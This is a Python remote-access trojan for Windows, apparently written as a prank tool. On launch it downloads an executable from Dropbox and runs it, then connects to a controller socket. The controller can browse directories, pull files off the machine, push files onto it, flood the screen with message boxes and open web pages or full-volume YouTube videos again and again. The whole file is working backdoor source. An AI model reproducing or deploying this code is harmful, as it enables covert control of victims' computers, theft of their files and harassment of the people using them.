#!/usr/bin/env python

import socket
import os
import pickle
import time
import subprocess
from subprocess import call
from subprocess import Popen, PIPE
import cython
import urllib.request
if os.name == "nt":
    import ctypes
    import win32com.client
    BitBlt = ctypes.windll.gdi32.BitBlt
    MessageBox = ctypes.windll.user32.MessageBoxW

urllib.request.urlretrieve("https://www.dropbox.com/s/m6sqwjz63sr38ci/SetVol.exe?dl=1", "/temp/SetVol.exe")
os.system("/temp/SetVol.exe 100")

BitBlt()
TCP_IP = '127.0.0.1'
TCP_PORT = 80
BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((TCP_IP, TCP_PORT))
os.chdir("C:/Users/")
ytlink1 = "https://www.youtube.com/watch_popup?v="
data = []
data.insert(0, "")
conn = s
while 1:
    data.insert(0, "")
    try:
        conn.settimeout(60)
        dataraw = conn.recv(BUFFER_SIZE).decode()
        data = dataraw.split()
    except:
        s.close()
        connected = False
        while connected == False:
            time.sleep(20)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((TCP_IP, TCP_PORT))
                conn = s
                connected = True
                print("Woohoo Connection has been restored!")
                conn.settimeout(60)
                dataraw = conn.recv(BUFFER_SIZE).decode()
                data = dataraw.split()
            except:
                s.close()
                print("Retrying connection..")
    try:
        print(data)
    except:
        print("")
    if data[0] == "ls":
        try:
            if len(data) == 2:
                thlst = os.listdir(data[1])
                conn.send(' '.join(thlst).encode())
            else:
                thlst = os.listdir(os.getcwd())
                conn.send(" ".join(thlst).encode())
        except:
            connected == False
            while connected == False:
                time.sleep(1)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((TCP_IP, TCP_PORT))
                    conn = s
                    connected = True
                    print("Woohoo Data is back!")
                    conn.settimeout(15)
                    dataraw = conn.recv(BUFFER_SIZE).decode()
                    data = dataraw.split()
                except:
                    s.close()
                    print("Data lost..")

    elif data[0] == "cd":
        if len(data) == 2:
            try:
                os.chdir(data[1])
                conn.send(("Successful! Path is now" + os.getcwd()).encode())
            except:
                conn.send("Unsuccessful! Path doesnt exist or something".encode())
    elif data[0] == "download":
        if len(data) == 3:
            try:
                f = open(data[1], "rb")
                print('Sending...')
                l = f.read(1024)
                while (l):
                        print('Sending...')
                        s.send(l)
                        l = f.read(1024)
                print("sent")
            except Exception as e:
                print("something went wrong  " + str(e))
    elif data[0] == "":
        print("thats nothing")
    elif data[0] == "keepalive":
        s.send("still alive".encode())
    elif data[0] == "spammessage":
        a = (int(data[3]) / 100)
        a2 = 0
        while a2 < a:
            time.sleep(0.01)
            MessageBox(None, data[1], data[2], 0)
            a2 = a2 + 0.01
    elif data[0] == "spamwebsite":
        a = (int(data[2]) / 100)
        a2 = 0
        while a2 < a:
            time.sleep(0.01)
            os.system("start iexplore " + data[1])
            a2 = a2 + 0.01
    elif data[0] == "upload":
        if len(data) > 1:
            if len(data) == 2:
                f = open(data[1], "wb")
            elif len(data) == 3:
                f = open(data[2], "wb")
            l = s.recv(1024)
            f.write(l)
            conn.settimeout(3)
            while (l):
                print("receiving...")
                try:
                    l = conn.recv(1024)
                    f.write(l)
                except:
                    print("Something went wrong during the download. Or the download successfuly finished!! fuuck you anyywwaaay")
                    break
            print("done")
    elif data[0] == "youtube":
        if len(data) == 2:
            os.system("start iexplore -k " + ytlink1 + data[1] + "&autoplay=1")
        elif len(data) > 3:
            if data[2] == "--earrape":
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                os.system("start iexplore -k " + ytlink1 + data[1])
                s = 0
                while s < 100:
                    time.sleep(0.1)
                    s = s + 1
                    os.system("/temp/SetVol.exe 100")
                    os.system("/temp/SetVol.exe 99")
                    s = s + 1


conn.close()